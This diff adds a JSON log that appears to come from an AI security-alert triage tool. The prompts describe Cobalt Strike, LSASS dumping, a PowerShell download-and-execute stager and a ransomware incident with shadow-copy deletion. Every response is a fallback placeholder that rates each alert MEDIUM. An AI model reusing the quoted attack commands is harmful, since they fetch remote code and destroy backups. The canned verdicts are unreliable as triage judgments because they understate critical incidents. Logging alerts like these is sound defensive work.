@@ -1,0 +1,127 @@
+[
+  {
+    "timestamp": "2026-03-24T19:01:35.235Z",
+    "prompt": "Alert: Suspicious PowerShell execution. Host: WIN-SRV-01.",
+    "response": {
+      "verdict": "SUSPICIOUS",
+      "severity": "MEDIUM",
+      "risk_score": 50,
+      "confidence": 60,
+      "attack_category": "Unknown Anomalous Activity",
+      "summary": "AI service unavailable due to network timeout or quota exhaustion. Basic heuristic limits applied and flagged for manual review.",
+      "mitre": [
+        {
+          "tactic": "Defense Evasion",
+          "technique": "T1562 - Impair Defenses"
+        }
+      ],
+      "iocs": [],
+      "timeline": [],
+      "recommendations": [
+        "Retry AI investigation later",
+        "Escalate to Level 3 Analyst manually",
+        "Verify alert logs locally"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-03-24T18:48:43.601Z",
+    "prompt": "Alert: Cobalt Strike Beacon C2 Communication\nHost: WORKSTATION-FINANCE-04 (10.0.1.84)\nProcess: rundll32.exe (PID 4821) spawned by winword.exe\nOutbound: 185.220.101.45:443 (TOR exit node)\nDNS: update.microsoftsvc[.]net (lookalike domain)\nFile: C:\\ProgramData\\MicrosoftUpdate\\svchost32.exe\nParent: WINWORD.EXE \"Q3_Report.docx\"\nUser: jsmith@corp.local (Finance Dept)\nEDR Score: 98/100 Malicious",
+    "response": {
+      "verdict": "SUSPICIOUS",
+      "severity": "MEDIUM",
+      "risk_score": 50,
+      "confidence": 60,
+      "attack_category": "Unknown Anomalous Activity",
+      "summary": "AI service unavailable due to network timeout or quota exhaustion. Basic heuristic limits applied and flagged for manual review.",
+      "mitre": [
+        {
+          "tactic": "Defense Evasion",
+          "technique": "T1562 - Impair Defenses"
+        }
+      ],
+      "iocs": [],
+      "timeline": [],
+      "recommendations": [
+        "Retry AI investigation later",
+        "Escalate to Level 3 Analyst manually",
+        "Verify alert logs locally"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-03-24T18:43:22.104Z",
+    "prompt": "Alert: Credential Dumping - LSASS Memory Access\nHost: DC-PRIMARY-01 (10.0.0.10) - Domain Controller\nProcess: mim.exe accessed lsass.exe memory (PID 892)\nMethod: SeDebugPrivilege + MiniDumpWriteDump API\nOutput: C:\\Temp\\lsass.dmp (47MB written)\nAlso: procdump64.exe run 30s earlier\nParent: cmd.exe via psexec service\nUser: CORP\\admintools (service account)",
+    "response": {
+      "verdict": "SUSPICIOUS",
+      "severity": "MEDIUM",
+      "risk_score": 50,
+      "confidence": 60,
+      "attack_category": "Unknown Anomalous Activity",
+      "summary": "AI service unavailable due to network timeout or quota exhaustion. Basic heuristic limits applied and flagged for manual review.",
+      "mitre": [
+        {
+          "tactic": "Defense Evasion",
+          "technique": "T1562 - Impair Defenses"
+        }
+      ],
+      "iocs": [],
+      "timeline": [],
+      "recommendations": [
+        "Retry AI investigation later",
+        "Escalate to Level 3 Analyst manually",
+        "Verify alert logs locally"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-03-24T18:43:13.675Z",
+    "prompt": "Alert: PowerShell Empire Framework Detected\nHost: LAPTOP-EXEC-12 (192.168.1.205)\nCommand: powershell.exe -NoP -sta -NonI -W Hidden -Enc <2048-char base64>\nDecoded: IEX (New-Object Net.WebClient).DownloadString('http://93.184.216.34/stage2')\nAMSI Bypass: amsiInitFailed patch detected\nPersistence: Scheduled task \"WindowsUpdate\" created\nBeacon: Every 5 seconds to C2\nUser: CEO laptop - mwilliams@corp.local",
+    "response": {
+      "verdict": "SUSPICIOUS",
+      "severity": "MEDIUM",
+      "risk_score": 50,
+      "confidence": 60,
+      "attack_category": "Unknown Anomalous Activity",
+      "summary": "AI service unavailable due to network timeout or quota exhaustion. Basic heuristic limits applied and flagged for manual review.",
+      "mitre": [
+        {
+          "tactic": "Defense Evasion",
+          "technique": "T1562 - Impair Defenses"
+        }
+      ],
+      "iocs": [],
+      "timeline": [],
+      "recommendations": [
+        "Retry AI investigation later",
+        "Escalate to Level 3 Analyst manually",
+        "Verify alert logs locally"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-03-24T18:42:58.416Z",
+    "prompt": "Alert: Ransomware - Mass File Encryption Detected\nHost: FILE-SERVER-01 (10.0.0.50)\nProcess: svhost.exe (not svchost) PID 7823\nFiles Modified: 14,823 in 4 minutes (.docx → .DARKBIT)\nShadow Copies: vssadmin delete shadows /all executed\nRansom Note: C:\\Users\\Public\\README_DECRYPT.txt\nC2: HTTPS to 5.188.86.114:443\nRegistry: HKLM\\CurrentControlSet\\Run modified",
+    "response": {
+      "verdict": "SUSPICIOUS",
+      "severity": "MEDIUM",
+      "risk_score": 50,
+      "confidence": 60,
+      "attack_category": "Unknown Anomalous Activity",
+      "summary": "AI service unavailable due to network timeout or quota exhaustion. Basic heuristic limits applied and flagged for manual review.",
+      "mitre": [
+        {
+          "tactic": "Defense Evasion",
+          "technique": "T1562 - Impair Defenses"
+        }
+      ],
+      "iocs": [],
+      "timeline": [],
+      "recommendations": [
+        "Retry AI investigation later",
+        "Escalate to Level 3 Analyst manually",
+        "Verify alert logs locally"
+      ]
+    }
+  }
+]
